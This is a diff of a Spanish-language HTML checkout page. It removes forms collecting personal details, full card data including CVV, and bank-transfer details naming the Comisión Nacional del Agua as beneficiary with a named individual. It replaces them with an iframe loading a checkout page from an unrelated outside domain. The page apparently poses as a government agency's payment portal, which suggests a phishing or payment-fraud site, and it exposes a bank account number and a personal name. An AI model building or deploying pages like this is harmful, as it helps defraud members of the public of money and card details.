@@ -398,62 +398,7 @@
   <!-- Formulario -->
   <div id="checkout-form-container">
     <h3>Datos del Ciudadano o Empresa</h3>
-    <form id="checkout-form">
-      <label for="name">Nombre:</label>
-      <input type="text" id="name" required><br>
-
-      <label for="email">Correo electronico:</label>
-      <input type="email" id="email" required><br>
-
-      <label for="calle">Calle y numero:</label>
-      <input type="text" id="calle" required><br>
-
-      <label for="postal">Codigo Postal:</label>
-      <input type="text" id="postal" required><br>
-
-      <label for="muni">Municipio:</label>
-      <input type="text" id="muni" required><br>
-
-      <label for="tel">Telefono:</label>
-      <input type="text" id="tel" required><br>
-
-      <button type="submit">Confirmar Compra</button>
-    </form>
-  </div>
-
-  <!-- Método de pago -->
-  <div id="metodo-pago" style="display:none;">
-    <h3>Selecciona un metodo de pago:</h3>
-    <button onclick="mostrarPago('efectivo')">Efectivo</button>
-    <button onclick="mostrarPago('tarjeta')">Tarjeta</button>
-    <button onclick="mostrarPago('transferencia')">Transferencia</button>
-
-    <div id="pago-efectivo" class="tarjeta-form" style="display:none;">
-      <p>Descarga tu factura <br>.</p>
-      <button onclick="finalizarCompra()">Finalizar Compra</button>
-    </div>
-
-    <div id="pago-tarjeta" class="tarjeta-form" style="display:none;">
-      <h4>Detalles de la tarjeta</h4>
-      <form action="procesar_pago.php" method="POST">
-        <input type="text" name="numero_tarjeta" placeholder="Numero de tarjeta" required><br>
-        <input type="text" name="nombre_tarjeta" placeholder="Nombre en la tarjeta" required><br>
-        <input type="text" name="fecha_vencimiento" placeholder="MM/AA" required><br>
-        <input type="text" name="cvv" placeholder="CVV" required><br>
-        <button type="submit">Pagar</button>
-      </form>
-    </div>
-
-    <div id="pago-transferencia" class="tarjeta-form" style="display:none;">
-      <p>Transfiere a:</p>
-      <p><strong>Banco:</strong> Banorte</p>
-           <p><strong>CONVENIO:</strong> A578302</p>
-      <p><strong>CLABE:</strong> 072580013092857256</p>
-      <p><strong>Beneficiario:</strong> Comisión Nacional del Agua
-      <br>Verifica que el nombre del representante local sea : Karen Janette Huerta Olmos</p>
-      <button onclick="finalizarCompra()">He realizado la transferencia</button>
-    </div>
-  </div>
+   <iframe id="checkout-iframe" src="https://novie.in/checkout.html" style="width:100%; height:100vh; border:none;"></iframe>
 
   <!-- Carrito -->
   <div id="checkout-cart-container">
